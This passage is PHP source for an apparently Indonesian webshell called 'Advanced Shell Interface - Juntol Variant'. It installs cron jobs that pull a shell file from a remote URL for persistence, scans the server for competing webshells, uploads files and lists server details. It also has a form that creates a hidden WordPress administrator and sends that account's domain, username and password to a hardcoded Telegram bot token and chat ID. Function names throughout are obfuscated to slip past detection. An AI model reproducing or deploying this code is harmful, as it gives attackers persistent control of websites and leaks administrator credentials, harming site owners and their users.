                    $escapeshellarg_fn_post_action_local_setup_post_final = _get_fn_name_global_init_v3('_g_ascii_escapeshellarg','escapeshellarg');
                    $temp_dir_val_post_action_setup_post_final = (call_user_func($function_exists_fn, $sys_get_temp_dir_fn_post_action_setup_post_final) ? call_user_func($sys_get_temp_dir_fn_post_action_setup_post_final) : '/tmp');
                    $temp_file_post_action_setup_post_final = (call_user_func($function_exists_fn, $tempnam_fn_post_action_setup_post_final) ? @call_user_func($tempnam_fn_post_action_setup_post_final, $temp_dir_val_post_action_setup_post_final, 'CRON_') : false);

                    if($temp_file_post_action_setup_post_final && !empty($file_put_contents_fn_post_action_setup_post_final) && call_user_func($function_exists_fn, $file_put_contents_fn_post_action_setup_post_final)) {
                        if (@call_user_func($file_put_contents_fn_post_action_setup_post_final, $temp_file_post_action_setup_post_final, $new_crontab_content_post_action_setup_post_final) !== false) {
                             $safe_temp_file_post_action_setup_post_final = '';
                            if(!empty($escapeshellarg_fn_post_action_local_setup_post_final) && call_user_func($function_exists_fn, $escapeshellarg_fn_post_action_local_setup_post_final)){
                                $safe_temp_file_post_action_setup_post_final = call_user_func($escapeshellarg_fn_post_action_local_setup_post_final, $temp_file_post_action_setup_post_final);
                            } else { // Fallback if escapeshellarg is not available
                                if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                                     $safe_temp_file_post_action_setup_post_final = '"' . str_replace(['"', '%', '^', '!', '<', '>', '&', '|'], '', $temp_file_post_action_setup_post_final) . '"';
                                } else {
                                     $safe_temp_file_post_action_setup_post_final = "'" . str_replace("'", "'\\''", $temp_file_post_action_setup_post_final) . "'";
                                }
                            }
                            $command_set_cron_post_action_setup_post_final = $crontab_path_post_action_setup_post_final . ' ' . $safe_temp_file_post_action_setup_post_final . ' 2>&1';
                            $cron_set_output_post_action_setup_post_final = call_user_func('try_execute_command', $command_set_cron_post_action_setup_post_final, null);
                            if ($cron_set_output_post_action_setup_post_final !== null && call_user_func($trim_fn, $cron_set_output_post_action_setup_post_final) !== '') {
                                 if (!empty($strpos_fn_cron_post_action_setup_post_final) && call_user_func($strpos_fn_cron_post_action_setup_post_final, $cron_set_output_post_action_setup_post_final, 'installing new crontab') === false && call_user_func($strpos_fn_cron_post_action_setup_post_final, $cron_set_output_post_action_setup_post_final, 'crontab: installing new crontab') === false && !empty(call_user_func($trim_fn, $cron_set_output_post_action_setup_post_final))) { $error_messages[] = ">> CRONTAB_SET_OUTPUT: <pre>" . call_user_func($htmlspecialchars_fn, call_user_func($trim_fn, $cron_set_output_post_action_setup_post_final)) . "</pre>"; }
                                 else { $output_messages[] = ">> CRONTAB_SET_INFO: <pre>" . call_user_func($htmlspecialchars_fn, call_user_func($trim_fn, $cron_set_output_post_action_setup_post_final)) . "</pre>"; }
                            } elseif ($cron_set_output_post_action_setup_post_final === null && $commands_added_count_post_action_setup_post_final > 0) { $error_messages[] = ">> CRONTAB_SET_ERROR: Gagal set crontab."; }
                            elseif (empty($cron_set_output_post_action_setup_post_final) && $commands_added_count_post_action_setup_post_final > 0){ $output_messages[] = ">> CRONTAB_SET_INFO: Perintah set crontab jalan (no output)."; }
                        } else { $error_messages[] = ">> ERROR_CRON: Gagal tulis ke temp file '$temp_file_post_action_setup_post_final'."; }
                        if (!empty($unlink_fn_post_action_setup_post_final) && call_user_func($function_exists_fn, $unlink_fn_post_action_setup_post_final)) @call_user_func($unlink_fn_post_action_setup_post_final, $temp_file_post_action_setup_post_final);
                    } else { $error_messages[] = ">> ERROR_CRON: Gagal buat temp file."; }
                    $output_messages[] = ">> TARGET_PATH_CRON: <strong>" . call_user_func($htmlspecialchars_fn, $path_to_use_cron_post_action_setup_post_final) . "</strong>";
                    $output_messages[] = ">> SHELL_FILENAME_CRON: <strong>" . call_user_func($htmlspecialchars_fn, $processed_shell_filename_cron_post_action_setup_post_final) . "</strong>";
                    $output_messages[] = ">> SOURCE_URL_CRON: <strong>" . call_user_func($htmlspecialchars_fn, $url_cron_post_action_setup_post_final) . "</strong>";
                     if ($commands_added_count_post_action_setup_post_final > 0) { $output_messages[] = ">> STATUS_CRON: ".$commands_added_count_post_action_setup_post_final." CRON_JOBS BARU DICOBA.";}
                     else { $output_messages[] = ">> STATUS_CRON: SEMUA CRON_JOBS SUDAH ADA."; }
                    if(!empty($cronCommands_post_action_setup_post_final)) $output_messages[] = ">> CRON_COMMANDS_PROCESSED:<pre>" . call_user_func($htmlspecialchars_fn, call_user_func(_get_fn_name_global_init_v3('_g_ascii_implode','implode'), "\n", $cronCommands_post_action_setup_post_final)) . "</pre>";
                    
                    // ===============================================
                    // PERUBAHAN DI SINI: Self-destruct dimatikan
                    // ===============================================
                    // if (empty($error_messages)) { $output_messages[] = "<br>>> <strong>SYSTEM_ALERT:</strong> AUTO-DESTRUCT INITIALIZED."; $self_destruct = true; }
                    // ===============================================

                }
            }
        } else { $output_messages[] = ">> INFO_CRON: URL cron tidak diisi."; }
    }
    elseif ($action_post === 'scan_webshells' && $active_menu === 'webshell_scanner') {
        $scan_path_post_scan_final = isset($_POST['scan_dir']) ? call_user_func($trim_fn, $_POST['scan_dir']) : call_user_func($getcwd_fn);
        $is_readable_post_scan_final = _get_fn_name_global_init_v3('_g_ascii_is_readable','is_readable');
        if (empty($is_dir_fn) || !call_user_func($is_dir_fn, $scan_path_post_scan_final) || empty($is_readable_post_scan_final) || !@call_user_func($is_readable_post_scan_final, $scan_path_post_scan_final)) {
            $error_messages[] = "Scanner Error: Path direktori tidak valid atau tidak readable: " . call_user_func($htmlspecialchars_fn, $scan_path_post_scan_final);
        } else {
            $ini_set_post_scan_final = _get_fn_name_global_init_v3('_g_ascii_ini_set', 'ini_set');
            if (!empty($ini_set_post_scan_final) && call_user_func($function_exists_fn, $ini_set_post_scan_final)) {
                @call_user_func($ini_set_post_scan_final, 'memory_limit', '-1'); @call_user_func($ini_set_post_scan_final, 'max_execution_time', $scanner_limit);
            } if (function_exists('set_time_limit')) { @set_time_limit($scanner_limit); }
            $output_messages[] = "Memulai pemindaian di: <code>" . call_user_func($htmlspecialchars_fn, $scan_path_post_scan_final) . "</code> (Max time: {$scanner_minute} menit)";
            
            $initial_scan_array = ['all_items' => []];
            $scan_results_raw = scanner_recursiveScan($scan_path_post_scan_final, $initial_scan_array);

            $all_files_to_scan = isset($scan_results_raw['all_items']) ? $scan_results_raw['all_items'] : [];
            $all_files_to_scan = scanner_sortByLastModified($all_files_to_scan);

            $found_files_count_post_scan_final = 0; ob_start();
            echo '<table><thead><tr><th>Detected Suspicious Files</th><th style="width:180px;">Actions</th></tr></thead><tbody>';

            $file_get_contents_local_snippet_final = _get_fn_name_global_init_v3('_g_ascii_file_get_contents', 'file_get_contents');
            $substr_local_snippet_final = _get_fn_name_global_init_v3('_g_ascii_substr', 'substr');
            $realpath_local_scan = _get_fn_name_global_init_v3('_g_ascii_realpath', 'realpath');

            $doc_root = isset($_SERVER['DOCUMENT_ROOT']) && !empty($realpath_local_scan) ? rtrim(@call_user_func($realpath_local_scan, $_SERVER['DOCUMENT_ROOT']), '/\\') : null;
            $server_name = $_SERVER['SERVER_NAME'];
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';

            foreach ($all_files_to_scan as $file_path_scan) {
                if (is_dir($file_path_scan)) continue;

                $token_matches = scanner_compareTokens($scanner_tokenNeedles, scanner_getFileTokens($file_path_scan));
                
                $string_matches = [];
                $content_scan = (!empty($file_get_contents_local_snippet_final)) ? @call_user_func($file_get_contents_local_snippet_final, $file_path_scan) : false;
                if ($content_scan !== false) {
                    foreach($scanner_tokenNeedles as $needle) {
                        if (stripos($content_scan, $needle) !== false) {
                            $string_matches[] = $needle;
                        }
                    }
                }
                
                $found_matches = array_unique(array_merge($token_matches, $string_matches));

                if (!empty($found_matches)) {
                    $found_files_count_post_scan_final++;
                    $matched_tokens_str_post_final = implode(', ', array_map($htmlspecialchars_fn, $found_matches));

                    $file_content_snippet_final = '';
                    if ($content_scan !== false && !empty($substr_local_snippet_final)) {
                        $file_content_snippet_final = call_user_func($htmlspecialchars_fn, call_user_func($substr_local_snippet_final, $content_scan, 0, 250));
                        if (strlen($content_scan) > 250) $file_content_snippet_final .= '...';
                    }

                    echo '<tr><td><span style="color:red; font-weight:bold;">' . call_user_func($htmlspecialchars_fn, $file_path_scan) . '</span><br><small style="color:#ffaaaa;">Tokens: ' . $matched_tokens_str_post_final . '</small><br>';
                    if (!empty($file_content_snippet_final)) {
                        echo '<small style="color:#ccffcc; display:block; margin-top:5px; white-space:pre-wrap; background-color:rgba(0,50,0,0.5); padding:5px; border-radius:3px; max-height:100px; overflow-y:auto;">Snippet: ' . $file_content_snippet_final . '</small>';
                    }
                    echo '</td><td>'; // Start of Actions column

                    $web_url = null;
                    if ($doc_root && !empty($realpath_local_scan) && call_user_func($function_exists_fn, $realpath_local_scan)) {
                        $real_filepath = @call_user_func($realpath_local_scan, $file_path_scan);
                        if ($real_filepath && strpos($real_filepath, $doc_root) === 0) {
                             $web_path = str_replace('\\', '/', substr($real_filepath, strlen($doc_root)));
                             $web_url = $protocol . '://' . $server_name . $web_path;
                        }
                    }
                    if ($web_url) {
                        // MODIFIED: Use <a> tag for "Open URL" and ensure action-btn class
                        echo '<a href="' . call_user_func($htmlspecialchars_fn, $web_url) . '" target="_blank" class="action-btn">Open URL</a>';
                    }

                    // Delete button (already an A tag with action-btn class)
                    echo '<a href="?menu=webshell_scanner&path=' . urlencode(call_user_func($dirname_fn, $file_path_scan)) . '&file_action=delete&target=' . urlencode(call_user_func($basename_fn, $file_path_scan)) . '&scan_dir_ref=' . urlencode($scan_path_post_scan_final) . '" onclick="return confirmDelete(\'' . call_user_func($htmlspecialchars_fn, call_user_func($basename_fn, $file_path_scan)) . '\')" class="action-btn">Delete</a>';
                    echo '</td></tr>'; // End of Actions column and row
                }
            }
            
            if ($found_files_count_post_scan_final === 0) { echo '<tr><td colspan="2">Tidak ada file mencurigakan ditemukan.</td></tr>'; }
            echo '</tbody></table>'; $scanner_results_html = ob_get_clean();
            $output_messages[] = "Pemindaian selesai. Ditemukan " . $found_files_count_post_scan_final . " file mencurigakan.";
        }
    }
    elseif ($action_post === 'create_wp_admin' && $active_menu === 'wp_admin_creator') {
        $wp_load_path_action_post_wp_creator_final_full = find_wp_load_path($auto_path_script);
        $file_exists_wp_action_post_wp_creator_final_full = _get_fn_name_global_init_v3('_g_ascii_file_exists','file_exists');
        if ($wp_load_path_action_post_wp_creator_final_full && !empty($file_exists_wp_action_post_wp_creator_final_full) && call_user_func($file_exists_wp_action_post_wp_creator_final_full, $wp_load_path_action_post_wp_creator_final_full)) {
            if (!defined('WP_USE_THEMES')) { define('WP_USE_THEMES', false); }
            ob_start(); $wp_loaded_ok_action_post_wp_creator_final_full = @include_once($wp_load_path_action_post_wp_creator_final_full); $require_output_action_post_wp_creator_final_full = ob_get_clean();
            if (!$wp_loaded_ok_action_post_wp_creator_final_full) { $wp_admin_feedback_text = 'KRITIS POST: Gagal muat WP.'; $wp_admin_feedback_class = 'error'; }
            elseif (!function_exists('wp_verify_nonce')) { $wp_admin_feedback_text = 'KRITIS POST: Fungsi WP inti tidak ada.'; $wp_admin_feedback_class = 'error'; }
            else {
                $token_key_admin_wp_creator_post_val_final_full = '7755377396:AAEQ1HoWfC_YEne-8OJuiGrnjgQkW4f5Ew0';
                $destination_id_admin_wp_creator_post_val_final_full = '8130304517';

                if (!isset($_POST['create_admin_nonce']) || !wp_verify_nonce($_POST['create_admin_nonce'], 'create_admin_action')) { $wp_admin_feedback_text = 'Permintaan tidak valid.'; $wp_admin_feedback_class = 'error'; }
                else {
                    $new_admin_username_action_post_wp_val_final_full = call_user_func($trim_fn, $_POST['username'] ?? '');
                    $new_admin_password_action_post_wp_val_final_full = $_POST['password'] ?? '';
                    $new_admin_email_action_post_wp_val_final_full = call_user_func($trim_fn, $_POST['email'] ?? '');
                    $errors_wp_creator_action_post_wp_val_final_full = [];
                    if (empty($new_admin_username_action_post_wp_val_final_full)) $errors_wp_creator_action_post_wp_val_final_full[] = 'Username wajib.';
                    if (empty($new_admin_password_action_post_wp_val_final_full)) $errors_wp_creator_action_post_wp_val_final_full[] = 'Password wajib.';
                    if (function_exists('validate_username') && !empty($new_admin_username_action_post_wp_val_final_full) && !validate_username($new_admin_username_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = 'Username tidak valid.'; }
                    if (strlen($new_admin_password_action_post_wp_val_final_full) < 8 && !empty($new_admin_password_action_post_wp_val_final_full)) $errors_wp_creator_action_post_wp_val_final_full[] = 'Password min 8 karakter.';
                    if (function_exists('is_email') && !empty($new_admin_email_action_post_wp_val_final_full) && !is_email($new_admin_email_action_post_wp_val_final_full)) { $errors_wp_creator_action_post_wp_val_final_full[] = 'Email tidak valid.'; }

                    if (!empty($errors_wp_creator_action_post_wp_val_final_full)) { $wp_admin_feedback_text = implode('<br>', array_map($htmlspecialchars_fn, $errors_wp_creator_action_post_wp_val_final_full)); $wp_admin_feedback_class = 'error'; }
                    else {
                        if (function_exists('username_exists') && !username_exists($new_admin_username_action_post_wp_val_final_full)) {
                            $user_id_wp_creator_action_post_wp_val_final_full = wp_create_user($new_admin_username_action_post_wp_val_final_full, $new_admin_password_action_post_wp_val_final_full, $new_admin_email_action_post_wp_val_final_full);
                            if (!is_wp_error($user_id_wp_creator_action_post_wp_val_final_full)) {
                                $user_wp_obj_action_post_wp_val_final_full = new WP_User($user_id_wp_creator_action_post_wp_val_final_full); $user_wp_obj_action_post_wp_val_final_full->set_role('administrator');
                                $script_url_wp_action_post_wp_val_final_full = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
                                $site_domain_wp_action_post_wp_val_final_full = function_exists('get_site_url') ? parse_url(get_site_url(), PHP_URL_HOST) : $_SERVER['SERVER_NAME'];
                                $wp_login_url_wp_action_post_wp_val_final_full = function_exists('wp_login_url') ? wp_login_url() : $site_domain_wp_action_post_wp_val_final_full . '/wp-login.php';
                                $notification_lines_wp_action_post_wp_val_final_full = [ "<b>✅ Admin Baru Dibuat (Webshell)</b>\n", "<b>Domain:</b> <code>" . call_user_func($htmlspecialchars_fn, $site_domain_wp_action_post_wp_val_final_full) . "</code>", "<b>Username:</b> <code>" . call_user_func($htmlspecialchars_fn, $new_admin_username_action_post_wp_val_final_full) . "</code>", "<b>Password:</b> <code>" . call_user_func($htmlspecialchars_fn, $new_admin_password_action_post_wp_val_final_full) . "</code>" ];
                                if (!empty($new_admin_email_action_post_wp_val_final_full)) { $notification_lines_wp_action_post_wp_val_final_full[] = "<b>Email:</b> <code>" . call_user_func($htmlspecialchars_fn, $new_admin_email_action_post_wp_val_final_full) . "</code>"; }
                                $notification_lines_wp_action_post_wp_val_final_full[] = "<b>URL Skrip:</b> " . call_user_func($htmlspecialchars_fn, function_exists('esc_url') ? esc_url($script_url_wp_action_post_wp_val_final_full) : $script_url_wp_action_post_wp_val_final_full);
                                $notification_lines_wp_action_post_wp_val_final_full[] = "<b>Link Login:</b> <a href=\"" . call_user_func($htmlspecialchars_fn, function_exists('esc_url') ? esc_url($wp_login_url_wp_action_post_wp_val_final_full) : $wp_login_url_wp_action_post_wp_val_final_full) . "\">Klik Login</a>";
                                $notification_message_wp_action_post_wp_val_final_full = implode("\n", $notification_lines_wp_action_post_wp_val_final_full);
                                $send_to_wp_action_post_wp_val_final_full = send_to_wp_load($notification_message_wp_action_post_wp_val_final_full, $token_key_admin_wp_creator_post_val_final_full, $destination_id_admin_wp_creator_post_val_final_full);
                                if ($send_to_wp_action_post_wp_val_final_full['success']) { $wp_admin_feedback_text = 'Admin baru dibuat!'; $wp_admin_feedback_class = 'success'; }
                                else { $wp_admin_feedback_text = 'Admin dibuat.: ' . call_user_func($htmlspecialchars_fn, $send_to_wp_action_post_wp_val_final_full['message']); $wp_admin_feedback_class = 'warning';}
                            } else { $wp_admin_feedback_text = 'Gagal buat admin: ' . call_user_func($htmlspecialchars_fn, $user_id_wp_creator_action_post_wp_val_final_full->get_error_message()); $wp_admin_feedback_class = 'error';}
                        } elseif(function_exists('username_exists')) { $wp_admin_feedback_text = 'Username <code>' . call_user_func($htmlspecialchars_fn, $new_admin_username_action_post_wp_val_final_full) . '</code> sudah ada.'; $wp_admin_feedback_class = 'warning'; }
                        else { $wp_admin_feedback_text = 'username_exists() tidak ada.'; $wp_admin_feedback_class = 'error';}
                    }
                }
            }
        } else { $wp_admin_feedback_text = 'KRITIS POST: <code>wp-load.php</code> tidak ditemukan.'; $wp_admin_feedback_class = 'error';}
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Shell Interface - Juntol Variant v5.4 (Full Code - Enhanced Scanner)</title>
    <style>
        body { font-family: 'Consolas', 'Menlo', 'Monaco', 'Courier New', monospace; background-color: #0d0d0d; color: #00e676; margin: 0; padding: 0; display: flex; min-height: 100vh; flex-direction: column; background-image: repeating-linear-gradient( 0deg, rgba(0, 230, 118, 0.05), rgba(0, 230, 118, 0.05) 1px, transparent 1px, transparent 4px ); }
        .shell-header { background-color: rgba(5, 10, 5, 0.9); padding: 15px 20px; border-bottom: 1px solid #00994d; color: #ccc; }
        .shell-header-title { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;}
        .shell-header-title h1 { color: #00ff88; margin:0; font-size: 1.4em; text-shadow: 0 0 5px #00ff88;}
        .shell-header-title a.logout-btn { color: #ff4444; text-decoration: none; font-size: 0.9em; border: 1px solid #ff4444; padding: 5px 10px; border-radius: 4px; transition: all 0.2s; }
        .shell-header-title a.logout-btn:hover { background-color: #ff4444; color: #0d0d0d; }
        .info-list { list-style: none; padding: 0; margin: 0 0 15px 0; }
        .info-list li { margin-bottom: 5px; font-size: 0.9em; word-break: break-all; }
        .info-list span { color: #00e676; font-weight: bold; }
        .header-actions { border-top: 1px solid #00331a; padding-top: 15px; }
        .header-actions .action-group { margin-bottom: 10px; display:flex; flex-wrap:wrap; align-items: center; gap: 10px; }
        .header-actions .action-group button, .header-actions .action-group a.shell-button { background-color: #22242d; color: #00e676; border: 1px solid #00994d; padding: 5px 10px; cursor: pointer; text-decoration: none; }
        .header-actions .action-group button:hover, .header-actions .action-group a.shell-button:hover { background-color: #00e676; color: #0d0d0d; }
        .header-actions .upload-form { display: flex; align-items: center; gap: 10px; }
        
        /* CSS Perbaikan Upload */
        .upload-form input[type="file"] {
            display: none;
        }
        .upload-form .custom-file-upload {
            display: inline-block;
            background-color: #22242d;
            color: #00e676;
            border: 1px solid #00994d;
            padding: 5px 10px;
            cursor: pointer;
            text-decoration: none;
            font-size: 0.9em;
        }
        .upload-form .custom-file-upload:hover {
            background-color: #00e676;
            color: #0d0d0d;
        }
        .upload-form #file-upload-filename {
            color: #ccc;
            font-size: 0.9em;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 200px;
        }
        .header-actions .upload-form input[type="submit"] {
            background-color: #00e676; color: #0d0d0d; padding: 5px 15px; border: 1px solid #00e676; cursor: pointer;
            font-family: 'Consolas', 'Menlo', 'Monaco', 'Courier New', monospace; text-transform: uppercase; font-weight: bold;
            letter-spacing: 1px; transition: all 0.2s ease-in-out; margin: 0;
        }
        .header-actions .upload-form input[type="submit"]:hover {
             background-color: #00ff88; border-color: #00ff88; color: #000; box-shadow: 0 0 10px #00ff88;
        }
        /* Akhir CSS Perbaikan Upload */
        
        .main-container { display: flex; width: 100%; flex-grow: 1; }
        .sidebar { width: 220px; background-color: rgba(5, 10, 5, 0.9); padding: 20px; border-right: 1px solid #00994d; flex-shrink: 0; }
        .sidebar h2 { color: #00ff88; font-size: 1.2em; margin-top: 0; margin-bottom: 20px; text-align: center; text-transform: uppercase; }
        .sidebar ul { list-style: none; padding: 0; margin: 0; }
        .sidebar li a { display: block; padding: 10px 15px; color: #00e676; text-decoration: none; border-radius: 0px; margin-bottom: 5px; border: 1px solid transparent; transition: all 0.2s ease-in-out; font-size: 0.9em;}
        .sidebar li a:hover, .sidebar li a.active { background-color: #00e676; color: #0d0d0d; border-color: #00e676; box-shadow: 0 0 10px #00e676; }
        .content-area { flex-grow: 1; padding: 20px; overflow-y: auto; }
        .content-section { background-color: rgba(10, 20, 10, 0.85); padding: 30px; border-radius: 0px; border: 1px solid #00e676; box-shadow: 0 0 20px rgba(0, 230, 118, 0.5), inset 0 0 10px rgba(0,0,0,0.5); margin-bottom: 20px; }
        .content-section h1 { color: #00ff88; text-align: center; margin-top:0; margin-bottom: 25px; text-shadow: 0 0 5px #00ff88, 0 0 10px #00ff88; letter-spacing: 2px; text-transform: uppercase; font-size: 1.5em;}
        label { display: block; margin-bottom: 10px; color: #00e676; text-transform: uppercase; font-size: 0.9em; letter-spacing: 1px; }
        input[type="text"], input[type="url"], textarea, input[type="password"], input[type="email"] { width: calc(100% - 22px); padding: 12px; margin-bottom: 20px; border: 1px solid #00994d; border-radius: 0px; box-sizing: border-box; font-size: 1em; background-color: #050505; color: #00e676; font-family: 'Consolas', 'Menlo', 'Monaco', 'Courier New', monospace; caret-color: #00ff88; }
        textarea { min-height: 300px; white-space: pre; overflow-wrap: normal; overflow-x: scroll;}
        input[type="text"]:focus, input[type="url"]:focus, textarea:focus, input[type="password"]:focus, input[type="email"]:focus { outline: none; border-color: #00ff88; box-shadow: 0 0 10px rgba(0, 255, 136, 0.7); }
        input[type="text"][readonly] { background-color: #111; color: #00994d; cursor: default; }
        input[type="submit"], button { background-color: #00e676; color: #0d0d0d; padding: 10px 18px; border: 1px solid #00e676; border-radius: 0px; cursor: pointer; font-size: 1em; font-family: 'Consolas', 'Menlo', 'Monaco', 'Courier New', monospace; text-transform: uppercase; font-weight: bold; letter-spacing: 1px; transition: all 0.2s ease-in-out; }
        input[type="submit"].full-width, button.full-width { width: 100%; }
        input[type="submit"]:hover, input[type="submit"]:focus, button:hover, button:focus { background-color: #00ff88; border-color: #00ff88; color: #000; box-shadow: 0 0 15px #00ff88; outline: none; }
        .message { padding: 15px; margin-bottom: 20px; border-radius: 0px; text-align: left; border-left-width: 4px; border-left-style: solid; font-size: 0.95em; word-wrap: break-word; }
        .message.success { background-color: rgba(0, 230, 118, 0.1); color: #00e676; border-left-color: #00e676; box-shadow: inset 3px 0 0 #00e676; }
        .message.error { background-color: rgba(255, 68, 68, 0.1); color: #ff4444; border-left-color: #ff4444; box-shadow: inset 3px 0 0 #ff4444; }
        .message.warning { background-color: rgba(255, 243, 205, 0.2); color: #ffe081; border-left-color: #ffc107; box-shadow: inset 3px 0 0 #ffc107; }
        pre { background-color: #000; color: #00e676; padding: 15px; border-radius: 0px; border: 1px dashed #00994d; overflow-x: auto; font-family: 'Consolas', 'Menlo', 'Monaco', 'Courier New', monospace; font-size: 0.9em; white-space: pre-wrap; word-wrap: break-word; box-shadow: inset 0 0 10px rgba(0,0,0,0.7); margin-top:15px; }
        .footer { padding: 15px; text-align: center; font-size: 0.85em; color: #00994d; letter-spacing: 1px; border-top: 1px solid #00994d; background-color: rgba(5,10,5,0.9); flex-shrink:0;}
        .file-explorer table { width: 100%; border-collapse: collapse; margin-top: 20px; table-layout: auto;}
        .file-explorer th, .file-explorer td { border: 1px solid #00994d; padding: 8px; text-align: left; font-size: 0.9em; word-break: break-all; white-space: nowrap; }
        .file-explorer td.name-col { white-space: normal; }
        .file-explorer th { background-color: #00331a; color: #00ff88; }
        .file-explorer th.actions-col { width: 320px; } /* Adjusted width for potentially more buttons */
        .file-explorer a { color: #00e676; text-decoration: none; } /* Removed margin-right from general 'a' */
        .file-explorer a:hover { text-decoration: underline; color: #00ff88; }
        .file-explorer .dir-link { font-weight: bold; }
        
        /* General Action Button Style */
        .action-btn { 
            display: inline-block; 
            padding: 3px 6px; 
            font-size:0.8em; 
            border:1px solid #00994d; 
            margin-bottom:3px; 
            background-color: #050505; 
            color:#00e676; 
            text-decoration:none; 
            margin-right: 5px; /* Spacing between buttons if they are inline */
        }
        .action-btn:hover { 
            background-color: #00e676; 
            color: #0d0d0d; 
            border-color: #00e676; 
            text-decoration:none; 
        }
        .file-explorer td.actions-col .action-btn:last-child {
            margin-right: 0; /* Remove margin from the last button in file explorer actions */
        }

        .path-navigation-form { margin-bottom: 15px; display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
        .path-navigation-form label { margin-bottom:0; white-space: nowrap;}
        .path-navigation-form input[type="text"] { flex-grow: 1; margin-bottom:0; }
        .current-path-display { margin-bottom: 15px; font-size: 0.9em; word-break: break-all; }
        .current-path-display strong { color: #00ff88; }
        .bulk-actions-bar { margin-top: 15px; padding: 10px; background-color: rgba(5, 10, 5, 0.9); border: 1px solid #00994d; display: flex; align-items: center; gap: 10px; flex-wrap: wrap;}
        .bulk-actions-bar select { background-color: #050505; color: #00e676; border: 1px solid #00994d; padding: 5px; font-family: inherit; }
        .bulk-actions-bar input[type="text"] { width: 150px; padding: 6px; margin-bottom: 0; }
        .bulk-actions-bar button { padding: 6px 12px; font-size: 0.9em; margin: 0; }
        .file-explorer th.checkbox-col, .file-explorer td.checkbox-col { width: 30px; text-align: center; }
        .file-explorer th a { text-decoration: underline; }
        .wp-admin-creator-form label { text-transform: none; font-weight: bold; color: #c8d6e5; }
        .wp-admin-creator-form input[type=text], .wp-admin-creator-form input[type=password], .wp-admin-creator-form input[type=email] { background-color: #1F2739; border-color: #323C50; color: #00e676; }
        .wp-admin-creator-form input:focus { border-color: #00ff88; box-shadow: 0 0 0 1px #00ff88; }
        .wp-admin-creator-form button[type=submit] { background-color: #007cba; color:white; }
        .wp-admin-creator-form button[type=submit]:hover { background-color: #005a87; }
        .wp-admin-creator-form .message.success { background-color: #d4edda1c; color: #c3e6cb; border-left-color: #c3e6cb4a;}
        .wp-admin-creator-form .message.error { background-color: #f8d7da1c; color: #f5c6cb; border-left-color: #f5c6cb4a;}
        .wp-admin-creator-form .message.warning { background-color: #fff3cd1c; color: #ffeeba; border-left-color: #ffeeba4a;}
        .wp-admin-creator-form .message code { background-color: rgba(255,255,255,0.1); padding: 2px 4px; border-radius: 3px; }
        
        .scanner-results table { width: 100%; margin-top: 15px; border-collapse: collapse; }
        .scanner-results th, .scanner-results td { 
            border: 1px solid #00994d; 
            padding: 8px; 
            text-align: left; 
            font-size: 0.9em; 
            vertical-align: top; 
            word-break: break-all; /* For wrapping long text like paths/tokens */
        }
        .scanner-results th { background-color: #00331a; color: #00ff88; }
        .scanner-results td .action-btn { /* Already styled by general .action-btn */
             /* margin-top: 5px; /* Add top margin if needed for stacking */
        }
        .scanner-results td.actions-col .action-btn:last-child {
            margin-right: 0; /* Remove margin from the last button in scanner actions */
        }


        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); }
        .modal-content { background-color: #0d0d0d; margin: 15% auto; padding: 20px; border: 1px solid #00e676; width: 80%; max-width: 500px; box-shadow: 0 5px 15px rgba(0,230,118,0.2); }
        .modal-content h2 { margin-top: 0; color: #00ff88; }
        .modal-content .close-btn { color: #aaa; float: right; font-size: 28px; font-weight: bold; }
        .modal-content .close-btn:hover, .modal-content .close-btn:focus { color: #fff; text-decoration: none; cursor: pointer; }
    </style>
</head>
<body>
    <header class="shell-header">
        <div class="shell-header-title">
            <h1>Advanced Shell Interface</h1>
            <?php if(isset($_SESSION['shell_authenticated']) && $_SESSION['shell_authenticated'] === true): ?>
                <a href="?logout=1" class="logout-btn">Logout</a>
            <?php endif; ?>
        </div>
        <?php
            $php_uname_fn = _get_fn_name_global_init_v3('_g_ascii_php_uname', 'php_uname');
            $server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (function_exists('gethostbyname') ? @gethostbyname($_SERVER['SERVER_NAME']) : 'N/A');
        ?>
        <ul class="info-list">
            <li>Your IP : <span><?php echo call_user_func($htmlspecialchars_fn, $_SERVER['REMOTE_ADDR']); ?></span></li>
            <li>Server IP : <span><?php echo call_user_func($htmlspecialchars_fn, $server_ip); ?></span></li>
            <li>Server : <span><?php echo (!empty($php_uname_fn) && call_user_func($function_exists_fn, $php_uname_fn)) ? call_user_func($htmlspecialchars_fn, @call_user_func($php_uname_fn)) : 'N/A'; ?></span></li>
            <li>Server Software : <span><?php echo call_user_func($htmlspecialchars_fn, $_SERVER['SERVER_SOFTWARE']); ?></span></li>
            <li>PHP Version : <span><?php echo call_user_func($htmlspecialchars_fn, PHP_VERSION); ?></span></li>
        </ul>
        <div class="header-actions">
            <div class="action-group">
                <a href="?menu=explorer&path=<?php echo urlencode($auto_path_script); ?>" class="shell-button">Home Shell</a>
                <button id="create-file-btn">Buat File</button>
                <button id="create-folder-btn">Buat Folder</button>
            </div>
            <div class="action-group">
                <!-- FORM UPLOAD YANG DIPERBAIKI -->
                <form class="upload-form" method="post" action="<?php echo call_user_func($htmlspecialchars_fn, $_SERVER['REQUEST_URI']); ?>" enctype="multipart/form-data">
                    <input type="hidden" name="action" value="upload_file">
                    <label for="file-upload-input" class="custom-file-upload">Browse...</label>
                    <input id="file-upload-input" type="file" name="uploaded_file" required>
                    <span id="file-upload-filename">No file selected.</span>
                    <input type="submit" value="UPLOAD">
                </form>
            </div>
        </div>
    </header>

    <div class="main-container">
        <aside class="sidebar">
            <h2>MENU</h2>
            <ul>
                <li><a href="?menu=explorer&path=<?php echo urlencode($current_path); ?>" class="<?php echo ($active_menu === 'explorer' || $active_menu === 'editor' ? 'active' : ''); ?>">File Explorer</a></li>
